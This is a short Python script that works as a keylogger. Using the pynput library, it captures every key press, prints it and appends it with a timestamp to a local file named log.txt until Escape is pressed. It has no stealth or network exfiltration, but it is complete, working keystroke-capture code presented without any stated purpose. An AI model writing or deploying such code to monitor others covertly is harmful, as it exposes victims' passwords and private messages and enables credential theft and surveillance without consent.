import pynput
from datetime import datetime

from pynput.keyboard import Key, Listener

count = 0
keys = []

def getTimeStamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def onPress(key):
    global count, keys

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    writeFile(keys)
    keys = []

def writeFile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            timestamp = getTimeStamp()
            k = str(key).replace("'", "")

            if k == "Key.space":
                f.write(f"[{timestamp}] SPACE\n")
            elif k == "Key.enter":
                f.write(f"[{timestamp}] ENTER\n")
            elif k.startswith("Key."):
                f.write(f"[{timestamp}] {k}\n")
            else:
                f.write(f"[{timestamp}] {k}\n")
                

def onRelease(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()